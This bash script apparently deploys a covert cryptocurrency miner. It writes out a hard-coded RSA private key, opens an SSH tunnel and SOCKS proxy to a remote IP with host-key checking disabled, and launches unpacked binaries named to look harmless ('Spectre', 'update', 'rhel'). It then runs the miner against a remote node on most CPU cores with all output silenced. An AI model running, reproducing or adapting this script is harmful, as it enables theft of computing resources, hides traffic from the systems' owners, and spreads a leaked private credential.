#!/bin/bash
TZ='Africa/Johannesburg'; export TZ
date
sleep 2


array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y_Shiny_')
ipaddress=$(curl -s api.ipify.org)
num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
used_num_of_cores=`expr $num_of_cores - 4`
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

sleep 2

echo ""
echo "You will be using $used_num_of_cores cores"
echo ""

sleep 2

cat > gituser <<END
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
END

sleep 2

chmod 600 gituser

sleep 2

ssh -i gituser -f -N -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L 1081:0.0.0.0:8443 -D 1080 git@45.135.56.238
sleep 2

tar -xf Spectre.tar.gz

sleep 2

./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@127.0.0.1:1081 &
sleep 2

tar -xf rhel.tar.gz
sleep 2

tar -xf update.tar.gz

sleep 2

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:1082
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

sleep 3

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

./update/update wget -q -O- http://api.ipify.org

sleep 2

echo "I have finished!"
sleep 2
echo " "
echo " "
echo " "
sleep 2

./rhel -v 3 -r 20 -s http://24-Feb-2025_rheRPC_206_189_127_32_LNCsd9Eq.emergencyaccess.teatspray.uk:28706 -cputhreads $used_num_of_cores -extrapayload SoloMiningToMyNodeLolWut 1>/dev/null 2>&1

